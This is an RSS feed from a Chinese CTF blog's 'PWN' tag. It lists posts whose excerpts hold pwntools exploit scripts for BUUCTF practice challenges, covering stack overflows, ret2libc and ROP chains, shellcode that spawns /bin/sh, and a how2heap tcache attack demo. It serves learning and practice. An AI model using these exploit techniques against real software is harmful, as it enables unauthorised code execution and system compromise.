<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
  <channel>
    <title>PWN - 标签 - Ghostasky&#39;s Blog</title>
    <link>http://ghostasky.github.io/tags/pwn/</link>
    <description>PWN - 标签 | Ghostasky&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><managingEditor>wt20wl@gmail.com (Ghostasky)</managingEditor>
      <webMaster>wt20wl@gmail.com (Ghostasky)</webMaster><lastBuildDate>Sun, 16 Jul 2023 00:00:00 &#43;0000</lastBuildDate><atom:link href="http://ghostasky.github.io/tags/pwn/" rel="self" type="application/rss+xml" /><item>
  <title>Linux Kernel Pwn</title>
  <link>http://ghostasky.github.io/posts/2023-7-linuxkernelpwn/</link>
  <pubDate>Sun, 16 Jul 2023 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/2023-7-linuxkernelpwn/</guid>
  <description><![CDATA[<p>坟墓里寂静无比，埋葬你的是你所有没说出口的话</p>]]></description>
</item>
<item>
  <title>BUU_PWN刷题_0x40-0x4F</title>
  <link>http://ghostasky.github.io/posts/buu-pwn-0x40-0x4f/</link>
  <pubDate>Sun, 17 Oct 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/buu-pwn-0x40-0x4f/</guid>
  <description><![CDATA[[TOC] 0x40.ciscn_2019_s_9 看下检查,全没开 yutao@ubuntu:~/Desktop$ checksec ./ciscn_s_9 [*] &#39;/home/yutao/Desktop/ciscn_s_9&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segmentsint pwn() { char s[24]; // [esp+8h] [ebp-20h] BYREF puts(&#34;\nHey! ^_^&#34;); puts(&#34;\nIt&#39;s nice to meet you&#34;); puts(&#34;\nDo you have anything to tell?&#34;); puts(&#34;&gt;&#34;); fflush(stdout); fgets(s, 50, stdin); puts(&#34;OK bye~&#34;); fflush(stdout); return 1; }有可用的gadget： .text:08048551 hint proc near .text:08048551 ; __unwind { .text:08048551 push ebp .text:08048552 mov ebp, esp .text:08048554 jmp esp .text:08048554 hint endp直接写shellcode的话会太长，]]></description>
</item>
<item>
  <title>IO_FILE调试&#43;详解</title>
  <link>http://ghostasky.github.io/posts/io_file/</link>
  <pubDate>Fri, 24 Sep 2021 23:09:51 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/io_file/</guid>
  <description><![CDATA[[TOC] 开始干__IO_FILE。会依次调fopen,fwrite,fread之类的IO函数的源码。 IO_FILE之fopen详解 demo程序 ##include&lt;stdio.h&gt; int main() { FILE*fp=fopen(&#34;test&#34;,&#34;wb&#34;); char *ptr=malloc(0x20); return 0; }源码分析 跟进去之后可以看到fopen实际是_IO_new_fopen函数。它调用的是]]></description>
</item>
<item>
  <title>Tcache_stashing_unlink_atack调试记录</title>
  <link>http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</link>
  <pubDate>Wed, 01 Sep 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/</guid>
  <description><![CDATA[代码是how2heap中libc2.27的代码 ##include &lt;stdio.h&gt; ##include &lt;stdlib.h&gt; ##include &lt;assert.h&gt; int main(){ unsigned long stack_var[0x10] = {0}; unsigned long *chunk_lis[0x10] = {0}; unsigned long *target; setbuf(stdout, NULL); printf(&#34;This file demonstrates the stashing unlink attack on tcache.\n\n&#34;); printf(&#34;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&#34;); printf(&#34;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#39;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&#34;); printf(&#34;The mechanism of putting smallbin into tcache in glibc gives us a chance to]]></description>
</item>
<item>
  <title>PWN刷题小结</title>
  <link>http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</link>
  <pubDate>Sun, 08 Aug 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/</guid>
  <description><![CDATA[[toc] 1.杂 Ubuntu 18下偶尔会发生栈无法对齐的情况，多retn几次就好了。 strlen()函数来判断输入的长度，遇到'\x00'时会终止，而gets()函数遇到'\x00'并不会截断 sys,write,puts,printf system(&quot;/binsh&quot;) p32(e.plt[&#39;system&#39;]) + p32(0xdeadbeef) + p32(sh_addr) p64(pop_rdi_ret) + p64(sh_addr) + p64(e.sym[&#39;system&#39;]) p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_plt) + p64(0xdeadbeef)]]></description>
</item>
<item>
  <title>BUU_PWN刷题_0x30-0x3F</title>
  <link>http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/</link>
  <pubDate>Sun, 18 Jul 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/buu-pwn-0x30-0x3f/</guid>
  <description><![CDATA[[TOC] 0x30.jarvisoj_level1 ssize_t vulnerable_function() { char buf[136]; // [esp+0h] [ebp-88h] BYREF printf(&#34;What&#39;s this:%p?\n&#34;, buf); return read(0, buf, 0x100u); }tmd，这题给的题目和平台的题不太一样，正常这道题的exp： from pwn import * context(log_level=&#39;debug&#39;) io = process(&#34;./level1&#34;) ##io = remote(&#34;node4.buuoj.cn&#34;,29905) buf_addr = int(io.recv()[-12:-2],16) payload = asm(shellcraft.sh()) payload +=(0x88+4-len(asm(shellcraft.sh())))*&#39;a&#39; + p32(buf_addr) print hex(buf_addr) io.sendline(payload) io.interactive()只能ret2libc了： from pwn import * context(log_level=&#39;debug&#39;) ##io = process(&#34;./level1&#34;) elf = ELF(&#34;./level1&#34;) libc = ELF(&#34;./libc-2.23.so&#34;) io = remote(&#34;node4.buuoj.cn&#34;,29905) payload =]]></description>
</item>
<item>
  <title>BUU_PWN刷题_0x21-0x2F</title>
  <link>http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/</link>
  <pubDate>Sun, 11 Jul 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/buu-pwn-0x20-0x2f/</guid>
  <description><![CDATA[[TOC] 0x20.jarvisoj_level3_x64 ret2libc from pwn import * context(log_level=&#39;debug&#39;) ##io = process(&#34;./level3_x64&#34;) io = remote(&#34;node3.buuoj.cn&#34;,29779) elf = ELF(&#34;./level3_x64&#34;) libc = ELF(&#34;./libc-x64-2.23.so&#34;) write_plt = elf.plt[&#39;write&#39;] read_got = elf.got[&#39;read&#39;] main_addr = elf.sym[&#39;main&#39;] pop_rdi_ret = 0x4006b3 pop_rsi_r15_ret = 0x4006b1 io.recv() payload = &#39;a&#39;*(0x88)+ p64(pop_rdi_ret)+p64(1) payload += p64(pop_rsi_r15_ret) +p64(read_got)+p64(8)+p64(write_plt)+ p64(main_addr) io.sendline(payload) read_add = u64(io.recv()[0:8]) print hex(read_add) base = read_add - libc.symbols[&#34;read&#34;] sys_add = base + libc.symbols[&#34;system&#34;] bin_sh = base + libc.search(&#34;/bin/sh&#34;).next() payload = &#39;a&#39;*(0x88)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_add)+p64(main_addr) io.sendline(payload) io.interactive()0x21.picoctf_2018_rop chain win1(): void win_function1() { win1 = 1; }win2(): int __cdecl win_function2(int a1) { int result; // eax result = (unsigned __int8)win1; if ( win1 &amp;&amp; a1 == 0xBAAAAAAD ) { win2 = 1; } else if ( win1 ) { result = puts(&#34;Wrong Argument. Try Again.&#34;); } else]]></description>
</item>
<item>
  <title>BUU_PWN刷题_0x01-0x0F</title>
  <link>http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/</link>
  <pubDate>Tue, 01 Jun 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/buu-pwn-0x01-0x0f/</guid>
  <description><![CDATA[0x1.test_your_nc nc一下就完事。 0x2.rip checksec： yutao@pwnbaby:~/Desktop$ checksec pwn1 [*] &#39;/home/yutao/Desktop/pwn1&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segmentsida打开，有个后门函数：fun() 双击s到stack of main，15字节，exp： from pwn import * io = process(&#34;./pwn1&#34;) payload = &#39;a&#39;*(0xf + 8) + p64(0x40118a) ##具体86还是87/8a]]></description>
</item>
<item>
  <title>BUU_PWN刷题_0x10-0x1F</title>
  <link>http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/</link>
  <pubDate>Tue, 01 Jun 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/buu-pwn-0x10-0x1f/</guid>
  <description><![CDATA[[TOC] 0x10.[HarekazeCTF2019]baby_rop 没后门函数： int __cdecl main(int argc, const char **argv, const char **envp) { char v4[16]; // [rsp+0h] [rbp-10h] BYREF system(&#34;echo -n \&#34;What&#39;s your name? \&#34;&#34;); __isoc99_scanf(&#34;%s&#34;, v4); printf(&#34;Welcome to the Pwn World, %s!\n&#34;, v4); return 0; }from pwn import * context(log_level=&#39;DEBUG&#39;) ##io = process(&#34;./babyrop&#34;) io = remote(&#39;node3.buuoj.cn&#39;,28280) elf = ELF(&#39;./babyrop&#39;) io.recv() sys_plt = elf.plt[&#34;system&#34;] pop_rdi_ret =0x0400683 bin_sh = 0x0601048 payload = &#39;a&#39;*0x18+ p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_plt)+p64(0xdeadbeef) io.sendline(payload) io.interactive()0x11.jarvisoj_level2_x64 ssize_t vulnerable_function() { char buf[128]; // [rsp+0h] [rbp-80h] BYREF system(&#34;echo Input:&#34;); return read(0, buf, 0x200uLL); }有/bin/sh字符串，没啥写的。 from pwn import * ##io = process(&#34;./level2_x64&#34;) io = remote(&#39;node3.buuoj.cn&#39;,28783) elf = ELF(&#34;./level2_x64&#34;) io.recv() sys_plt =]]></description>
</item>
<item>
  <title>CISCN_PWN</title>
  <link>http://ghostasky.github.io/posts/ciscn-pwn/</link>
  <pubDate>Thu, 08 Apr 2021 00:00:00 &#43;0000</pubDate>
  <author>Ghostasky</author>
  <guid>http://ghostasky.github.io/posts/ciscn-pwn/</guid>
  <description><![CDATA[[TOC] ciscn_2019_s_3 32位与64位 系统调用的区别： 1. 传参方式不同 2. 系统调用号 不同 3. 调用方式 不同 32位： 传参方式：首先将系统调用号 传入 eax，然后将参数 从左到右 依次存入 ebx，ecx，edx寄存器中，返回值存在eax寄存器 调用号：sys_read 的调用号 为 3]]></description>
</item>
</channel>
</rss>
